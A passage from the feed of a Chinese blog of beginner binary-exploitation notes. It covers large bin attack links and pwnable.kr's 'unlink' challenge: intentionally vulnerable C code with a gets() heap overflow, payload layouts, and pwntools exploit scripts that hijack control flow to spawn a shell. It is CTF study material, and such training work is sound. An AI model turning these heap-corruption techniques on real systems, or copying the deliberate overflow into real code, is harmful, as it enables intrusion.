&lt;p&gt;&lt;a href=&#34;https://www.52pojie.cn/forum.php?mod=viewthread&amp;amp;tid=591986&amp;amp;highlight=elf+%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD&#34;&gt;https://www.52pojie.cn/forum.php?mod=viewthread&amp;amp;tid=591986&amp;amp;highlight=elf%2B%BD%E2%CE%F6&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="研究生课程" />
        <updated>2023-03-14T01:26:04.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-21-pwn-college-Fundamentals/</id>
        <title>pwn入门-21-pwn.college-Fundamentals</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-21-pwn-college-Fundamentals/"/>
        <content type="html">&lt;div class=&#34;hbe hbe-container&#34; id=&#34;hexo-blog-encrypt&#34; data-wpm=&#34;Oh, this is an invalid password. Check and try again, please.&#34; data-whm=&#34;OOPS, these decrypted content may changed, but you can still have a look.&#34;&gt;
  &lt;script id=&#34;hbeData&#34; type=&#34;hbeData&#34; data-hmacdigest=&#34;e6c7212bcc454d4831365f258f1eabf76f78a92497ff504b3f395af6e5f2a727&#34;&gt;&lt;/script&gt;
  &lt;div class=&#34;hbe hbe-content&#34;&gt;
    &lt;div class=&#34;hbe hbe-input hbe-input-default&#34;&gt;
      &lt;input class=&#34;hbe hbe-input-field hbe-input-field-default&#34; type=&#34;password&#34; id=&#34;hbePass&#34;&gt;
      &lt;label class=&#34;hbe hbe-input-label hbe-input-label-default&#34; for=&#34;hbePass&#34;&gt;
        &lt;span class=&#34;hbe hbe-input-label-content hbe-input-label-content-default&#34;&gt;Hey, password is required here.&lt;/span&gt;
      &lt;/label&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;script data-pjax src=&#34;/lib/hbe.js&#34;&gt;&lt;/script&gt;&lt;link href=&#34;/css/hbe.style.css&#34; rel=&#34;stylesheet&#34; type=&#34;text/css&#34;&gt;</content>
        <category term="PWN入门" />
        <updated>2023-03-13T10:54:41.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-20-pwn-college-UAF%E5%8F%8Atcache/</id>
        <title>pwn入门-20-pwn.college-UAF及tcache</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-20-pwn-college-UAF%E5%8F%8Atcache/"/>
        <content type="html">&lt;div class=&#34;hbe hbe-container&#34; id=&#34;hexo-blog-encrypt&#34; data-wpm=&#34;Oh, this is an invalid password. Check and try again, please.&#34; data-whm=&#34;OOPS, these decrypted content may changed, but you can still have a look.&#34;&gt;
  &lt;script id=&#34;hbeData&#34; type=&#34;hbeData&#34; data-hmacdigest=&#34;421df2e0c365a1d8fba4ed229382fa53255cde9c20bc8d82027380ff7ee6987d&#34;&gt;757d6246220447313784a310f701cd401fb2b1a545efaab207cb22606a616648dce83e31935e07c038d5318312eaf48212207018a1e312f166cabc16419929bd145ba153f22c084516d022044e26141aa82d476546849ee368eef75b9597e23c92a32019c8195ada1008a60d640feeaa&lt;/script&gt;
  &lt;div class=&#34;hbe hbe-content&#34;&gt;
    &lt;div class=&#34;hbe hbe-input hbe-input-default&#34;&gt;
      &lt;input class=&#34;hbe hbe-input-field hbe-input-field-default&#34; type=&#34;password&#34; id=&#34;hbePass&#34;&gt;
      &lt;label class=&#34;hbe hbe-input-label hbe-input-label-default&#34; for=&#34;hbePass&#34;&gt;
        &lt;span class=&#34;hbe hbe-input-label-content hbe-input-label-content-default&#34;&gt;Hey, password is required here.&lt;/span&gt;
      &lt;/label&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;script data-pjax src=&#34;/lib/hbe.js&#34;&gt;&lt;/script&gt;&lt;link href=&#34;/css/hbe.style.css&#34; rel=&#34;stylesheet&#34; type=&#34;text/css&#34;&gt;</content>
        <category term="PWN入门" />
        <updated>2023-03-13T07:12:24.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-19-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8BLarge-Bin-Attack/</id>
        <title>pwn入门-19-堆入门之Large_Bin_Attack</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-19-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8BLarge-Bin-Attack/"/>
        <content type="html">&lt;p&gt;2.23 与2.30的分析,, 搭建源码,看源码,  做题&lt;/p&gt;
&lt;p&gt;分析漏洞伪造重点,步骤&lt;/p&gt;
&lt;p&gt;large bin 的攻击手法,根据libc的版本不同,随着libc版本的更新,加入了很多新的防御手法&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_41202237/article/details/112825556&#34;&gt;https://blog.csdn.net/qq_41202237/article/details/112825556&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/&#34;&gt;https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/shellphish/how2heap&#34;&gt;https://github.com/shellphish/how2heap&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/A951860555/article/details/115477532&#34;&gt;https://blog.csdn.net/A951860555/article/details/115477532&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://lexsd6.github.io/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/&#34;&gt;https://lexsd6.github.io/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20学习/&lt;/a&gt;&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-19-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8BLarge-Bin-Attack/image-20230406085208132.png&#34; alt=&#34;image-20230406085208132&#34; style=&#34;zoom:25%;&#34;&gt;



&lt;p&gt;gdb里查看源代码 list&lt;/p&gt;
&lt;h1 id=&#34;2-23&#34;&gt;&lt;a href=&#34;#2-23&#34; class=&#34;headerlink&#34; title=&#34;2.23&#34;&gt;&lt;/a&gt;2.23&lt;/h1&gt;&lt;p&gt;可以实现任意地址写&lt;/p&gt;
&lt;p&gt;分析漏洞利用过程,  同时分析源码,   为什么会这样, 以及分析一下可以怎么样做到利用,然后找例题做一下&lt;/p&gt;
&lt;p&gt;下一下libc源码,分析分析 如何进行调试glibc&lt;/p&gt;
&lt;p&gt;为啥那个0x90的有四个值???&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-19-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8BLarge-Bin-Attack/image-20230405220251607.png&#34; alt=&#34;image-20230405220251607&#34;&gt;&lt;/p&gt;
&lt;p&gt;1先放进large bin 2后放进去,然后再切歌1? fifo&lt;/p&gt;
&lt;p&gt;还是说2 1都放进largebin里,然后再切割? largebin是filo?&lt;/p&gt;
&lt;p&gt;总的来说,就是要伪造一个chunk,修改bk和bk_nextsize为想要修改的地址(还需要微调,bk的要-0x10,bk_nextsize要-0x20)&lt;/p&gt;
&lt;h1 id=&#34;2-30后加入了新保护&#34;&gt;&lt;a href=&#34;#2-30后加入了新保护&#34; class=&#34;headerlink&#34; title=&#34;2.30后加入了新保护&#34;&gt;&lt;/a&gt;2.30后加入了新保护&lt;/h1&gt;</content>
        <category term="PWN入门" />
        <updated>2023-03-08T11:47:35.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-18-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bunlink/</id>
        <title>pwn入门-18-堆入门之unlink</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-18-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bunlink/"/>
        <content type="html">&lt;ul&gt;
&lt;li&gt;FD&amp;#x3D;P-&amp;gt;fd &amp;#x3D; target addr -12&lt;/li&gt;
&lt;li&gt;BK&amp;#x3D;P-&amp;gt;bk &amp;#x3D; expect value&lt;/li&gt;
&lt;li&gt;FD-&amp;gt;bk &amp;#x3D; BK，即 *(target addr-12+12)&amp;#x3D;BK&amp;#x3D;expect value&lt;/li&gt;
&lt;li&gt;BK-&amp;gt;fd &amp;#x3D; FD，即 *(expect value +8) &amp;#x3D; FD &amp;#x3D; target addr-12&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;堆块的链接顺序是从大到小还是??&lt;/p&gt;
&lt;p&gt;Pwnable&lt;/p&gt;
&lt;p&gt;​	gcc -Wl,-rpath&amp;#x3D;&amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.23-0ubuntu3_amd64&amp;#x2F;&amp;#x2F;,–dynamic-linker&amp;#x3D;&amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.23-0ubuntu3_amd64&amp;#x2F;ld-linux-x86-64.so.2 1.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;tagOBJ&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;tagOBJ&lt;/span&gt;* &lt;span class=&#34;title&#34;&gt;fd&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;tagOBJ&lt;/span&gt;* &lt;span class=&#34;title&#34;&gt;bk&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;OBJ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	system(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(OBJ* P)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	OBJ* BK;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	OBJ* FD;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	BK=P-&amp;gt;bk;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	FD=P-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	FD-&amp;gt;bk=BK;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	BK-&amp;gt;fd=FD;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* argv[])&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	OBJ* A = (OBJ*)&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(OBJ));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	OBJ* B = (OBJ*)&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(OBJ));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	OBJ* C = (OBJ*)&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(OBJ));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;// double linked list: A &amp;lt;-&amp;gt; B &amp;lt;-&amp;gt; C&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	A-&amp;gt;fd = B;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	B-&amp;gt;bk = A;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	B-&amp;gt;fd = C;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	C-&amp;gt;bk = B;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;here is stack address leak: %p\n&amp;quot;&lt;/span&gt;, &amp;amp;A);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;here is heap address leak: %p\n&amp;quot;&lt;/span&gt;, A);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;now that you have leaks, get shell!\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;// heap overflow!&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	gets(A-&amp;gt;buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;// exploit this unlink!&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	unlink(B);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;A&amp;quot;*16 + (heap_addr+0x20+0x4) + (stack_addr+0x10) + (shell_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;A&amp;quot;*16 +  (target addr -12)  + ( expect value:ebp -x04)    + (shell_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		这个是要把堆中地址&lt;/p&gt;
&lt;p&gt;接收到stack地址,修改返回地址?&lt;/p&gt;
&lt;h1 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h1&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./unlink&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ELF=ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;./unlink&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stack = sh.recvline().strip()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap = sh.recvline().strip()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p32(ELF.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;shell&amp;#x27;&lt;/span&gt;]) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;	 + p32(heap+&lt;span class=&#34;number&#34;&gt;0xc&lt;/span&gt;) + p32(stack+&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pwn_ssh = ssh(host=&amp;#x27;pwnable.kr&amp;#x27;,user=&amp;#x27;unlink&amp;#x27;,password=&amp;#x27;guest&amp;#x27;,port=2222)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;/home/unlink/unlink&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;line1=p.readline().strip()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;line2=p.readline().strip()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stack_addr = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(line1.split(&lt;span class=&#34;string&#34;&gt;&amp;#x27;: 0x&amp;#x27;&lt;/span&gt;)[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;], &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_addr = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(line2.split(&lt;span class=&#34;string&#34;&gt;&amp;#x27;: 0x&amp;#x27;&lt;/span&gt;)[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;], &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell_addr = &lt;span class=&#34;number&#34;&gt;0x080484eb&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt; + p32(heap_addr+&lt;span class=&#34;number&#34;&gt;0x24&lt;/span&gt;) + p32(stack_addr+&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;) + p32(shell_addr))&lt;/span&gt;&lt;br&gt;&lt;span 